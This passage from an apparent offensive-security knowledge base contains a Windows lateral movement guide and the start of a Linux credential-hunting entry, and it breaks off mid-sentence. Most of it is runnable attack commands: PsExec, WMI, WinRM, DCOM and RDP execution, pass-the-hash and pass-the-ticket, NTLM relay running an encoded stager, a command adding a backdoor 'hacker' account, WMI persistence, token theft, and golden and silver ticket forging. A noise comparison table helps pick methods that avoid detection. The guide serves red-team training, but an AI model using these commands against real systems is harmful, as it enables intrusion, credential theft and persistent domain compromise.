C:\\temp\\beacon.exe\n```\n\n**psexec.py** drops a randomly named executable to the ADMIN$ share and creates a Windows service — generates Event 7045 (service install) and is widely detected.\n\n**smbexec.py** is stealthier as it uses `cmd.exe /Q /c` piped through a service without dropping a binary. Still creates Event 7045.\n\n## WMI Execution\n\n```bash\n# Impacket wmiexec.py (semi-interactive shell via WMI)\nwmiexec.py target.local/admin:password@10.0.0.5\nwmiexec.py -hashes :NTLM_HASH target.local/admin@10.0.0.5\n\n# Native Windows\nwmic /node:10.0.0.5 /user:admin /password:password process call create \"cmd.exe /c whoami > C:\\temp\\output.txt\"\n\n# PowerShell via WMI\nInvoke-WmiMethod -Computer 10.0.0.5 -Credential $cred -Class Win32_Process -Name Create -ArgumentList \"powershell -ep bypass -e BASE64\"\n```\n\nWMI execution does not create a service — it spawns processes under `WmiPrvSE.exe`. Generates Event 4648 (explicit credential logon) and WMI event logs.\n\n## WinRM\n\n```bash\n# Evil-WinRM (full featured — file upload/download, DLL loading, AMSI bypass)\nevil-winrm -i 10.0.0.5 -u admin -p password\nevil-winrm -i 10.0.0.5 -u admin -H NTLM_HASH\n\n# PowerShell remoting\nEnter-PSSession -ComputerName 10.0.0.5 -Credential $cred\nInvoke-Command -ComputerName 10.0.0.5 -Credential $cred -ScriptBlock { whoami }\n\n# winrs.exe (native Windows)\nwinrs -r:10.0.0.5 -u:admin -p:password cmd.exe\n```\n\nWinRM uses port 5985 (HTTP) or 5986 (HTTPS). Processes spawn under `wsmprovhost.exe`. Requires the target to have WinRM enabled (default on Server 2012+).\n\n## RDP\n\n```bash\n# xfreerdp\nxfreerdp /v:10.0.0.5 /u:admin /p:password /dynamic-resolution\n\n# Restricted Admin Mode (pass-the-hash via RDP — no password needed)\n# Must be enabled on target: reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0\nxfreerdp /v:10.0.0.5 /u:admin /pth:NTLM_HASH /restricted-admin\n\n# SharpRDP (command execution via RDP without full GUI session)\nSharpRDP.exe computername=10.0.0.5 command=\"C:\\temp\\beacon.exe\" username=admin password=password\n```\n\nRDP creates a full interactive session. Generates Event 4624 (Type 10 RemoteInteractive logon). Session is visible to users.\n\n## DCOM Lateral Movement\n\nAbuse COM objects that support remote instantiation:\n\n```powershell\n# MMC20.Application\n$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.0.0.5\"))\n$com.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c C:\\temp\\beacon.exe\",\"7\")\n\n# ShellBrowserWindow\n$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C90A8F39\",\"10.0.0.5\"))\n$com.Document.Application.ShellExecute(\"cmd.exe\",\"/c payload.exe\",\"C:\\temp\",\"\",0)\n```\n\nDCOM uses port 135 (RPC) + dynamic high ports. Less commonly monitored than SMB/WMI.\n\n## Pass-the-Hash / Pass-the-Ticket\n\n```bash\n# Pass-the-Hash: use NTLM hash without knowing plaintext\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H :NTLM_HASH\nimpacket-psexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.20\nimpacket-wmiexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.20\n\n# Pass-the-Ticket: inject Kerberos ticket\nRubeus.exe ptt /ticket:ticket.kirbi\nmimikatz \"kerberos::ptt ticket.kirbi\"\nklist # verify ticket injected\n\n# Overpass-the-Hash: convert NTLM hash to Kerberos TGT\nmimikatz \"sekurlsa::pth /user:user /domain:corp.local /ntlm:HASH /run:powershell.exe\"\n```\n\n## SCShell (Service Control Lateral Movement)\n\nSCShell uses ChangeServiceConfigA to execute commands via the Service Control Manager — avoids PsExec's service creation artifact:\n\n```bash\n# Modifies existing service to run payload, triggers it, restores original config\npython3 scshell.py corp.local/Administrator:password@192.168.1.20 \\\n -service XblAuthManager \\\n -payload \"cmd.exe /c net user hacker P@ss123! /add\"\n```\n\n## CrackMapExec (Multi-Protocol)\n\n```bash\n# SMB execution\ncrackmapexec smb 10.0.0.0/24 -u admin -p password -x 'whoami' --exec-method smbexec\n\n# WinRM execution\ncrackmapexec winrm 10.0.0.0/24 -u admin -p password -x 'whoami'\n\n# Mass credential validation\ncrackmapexec smb targets.txt -u admin -p password --continue-on-success\n\n# Share spider\ncrackmapexec smb 10.0.0.0/24 -u admin -p password --spider C$ --pattern pass\n```\n\n## OpSec Comparison\n\n| Method | Noise Level | Artifacts | Port |\n|--------|-------------|-----------|------|\n| PsExec | High | Service install, binary drop | 445 |\n| smbexec | Medium | Service install (no binary) | 445 |\n| WMI | Low-Medium | WMI event log | 135+dynamic |\n| WinRM | Low | PowerShell logging | 5985/5986 |\n| DCOM | Low | Minimal logging | 135+dynamic |\n| Sched Task | Medium | Task creation event | 445 |\n| RDP | High | Full session, screenshot | 3389 |\n\n## ◈ ADVANCED\n\n### DCOM Pivoting Without Admin\n\nSome COM objects accessible to non-admin users enable limited code execution:\n\n```powershell\n# Outlook COM (if Outlook installed, user-level access)\n$outlook = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Outlook.Application\",\"10.0.0.5\"))\n\n# Visual Studio Code COM server (if installed)\n# These COM objects accept remote instantiation and may not require admin\n```\n\n**ShellWindowsGateway** pattern: instantiate COM that doesn't require admin, chain through it to higher-privilege objects.\n\n### NTLM Relay Lateral Movement\n\nInstead of using captured credentials directly, relay them to reach additional machines:\n\n```bash\n# ntlmrelayx + Responder combination\n# Disable conflicting services in Responder\nsed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf\nresponder -I eth0 -rdwv &\n\n# Relay captured hashes to all SMB targets\nntlmrelayx.py -tf smb_targets.txt -smb2support -c \"powershell -enc BASE64_STAGER\"\n\n# Or relay to specific high-value targets\nntlmrelayx.py -t smb://dc01.corp.local -smb2support --no-http-server\n```\n\n### Kerberos Delegation Abuse for Lateral Movement\n\nIf a machine account has **Unconstrained Delegation**, it stores TGTs from all users who authenticate to it:\n\n```bash\n# Find unconstrained delegation computers\nGet-DomainComputer -Unconstrained | Select Name\n\n# If admin on the unconstrained delegation server:\n# Coerce a DC to authenticate to your server (PrinterBug/PetitPotam)\nRubeus.exe monitor /interval:5 /nowrap # start monitoring for new tickets\nSpoolSample.exe dc01.corp.local unconstrained_server.corp.local\n# DC's TGT appears in Rubeus monitor output\n\n# Inject the captured DC TGT\nRubeus.exe ptt /ticket:base64_ticket\n# Now perform DCSync\nsecretsdump.py -no-pass -k dc01.corp.local\n```\n\n**Constrained Delegation** with Protocol Transition: machine accounts with `msDS-AllowedToDelegateTo` can request tickets to specific services on behalf of any user — usable as a lateral movement bridge.\n\n### WMI Event Subscription Lateral Movement\n\nWMI subscriptions execute code in response to system events — they run under SYSTEM context and survive reboots:\n\n```powershell\n# Create permanent WMI subscription that executes when any user logs in\n$Filter = Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{\n Name = \"WindowsUpdate\"; EventNamespace = \"root\\cimv2\"\n Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n QueryLanguage = \"WQL\"\n}\n# Add consumer and binding to complete the subscription\n```\n\nThis is a persistence technique that can also be deployed laterally via WMI remote connection — if you have admin on a remote machine, plant the subscription there.\n\n### Token Theft During Lateral Movement\n\nAfter landing on a machine via WMI/WinRM, look for better tokens before moving further:\n\n```powershell\n# In meterpreter/CS beacon:\n# Check for logged-in high-privilege users\nquery session # or qwinsta\nquery user\n\n# If DA is logged in on this machine:\n# 1. Dump LSASS to get their credentials\n# 2. Or steal their token directly\nsteal_token \n\n# This is why BloodHound \"HasSession\" edges are so valuable\n# They show exactly where to go for token theft\n```\n\n### Golden/Silver Ticket for Persistent Lateral Access\n\nAfter obtaining krbtgt hash (Golden) or service account hash (Silver):\n\n```bash\n# Golden Ticket — authenticate as any user to any service domain-wide\n# Survives user password changes (krbtgt hash change requires two rotations)\nmimikatz \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt\"\n\n# Silver Ticket — authenticate to a specific service as any user\n# More targeted, less detected (no DC communication during auth)\nmimikatz \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:target_server /service:cifs /rc4:SERVICE_HASH /ptt\"\n```\n\nSilver tickets generate no DC authentication events — only the target service validates the ticket locally.", "last_updated": "2026-03-18"}, "linux-credential-hunting": {"slug": "linux-credential-hunting", "title": "Linux Credential Hunting", "category": "Linux Privesc", "content": "# Linux Credential Hunting\n\n## ◈ BEGINNER\n\n### What is Credential Hunting on Linux?\n\nAfter gaining access to a Linux system, the next step is often finding credentials — passwords, keys, tokens — that let you escalate privileges, access databases, or move laterally to other machines.\n\n**What are you looking for?**\n- SSH private keys (files that let you log in to other servers without a password)\n- Configuration files with database passwords, API keys, or secrets\n- Shell history files where someone typed a password in a command\n- Application credentials in memory or environment variables\n- Cloud provider credentials (AWS, Azure, GCP) stored in home directories\n\n**Why is this effective?**\nDevelopers and administrators often store credentials in plaintext because it's convenient. Configuration files, `.env` files, history files, and application databases regularly contain secrets. Unlike Windows, Linux has fewer centralized secrets stores — credentials end up scattered across the filesystem.\n\n**Key terms:**\n- **SSH private key** — a cryptographic file (usually `id_rsa`, `id_ed25519`) that proves your identity; if found, it lets you log in to any server where the corresponding public key is authorized\n- **.bash_history** — a log of every command typed in bash; frequently contains passwords typed with `-p password` flags\n- **environment variables** — in-memory name=value pairs for a running process; applications often load secrets here to avoid writing them to disk\n- **/etc/shadow** — Linux password hash file; requires root to read normally, but can be cracked if obtained\n- **keytab** — a Kerberos credential file that functions like a password hash; enables authentication without knowing the actual password\n- **service account** — a non-human account used by applications; often has weak passwords and broad access\n\n**Analogy:** A cleaning crew has access to every office.
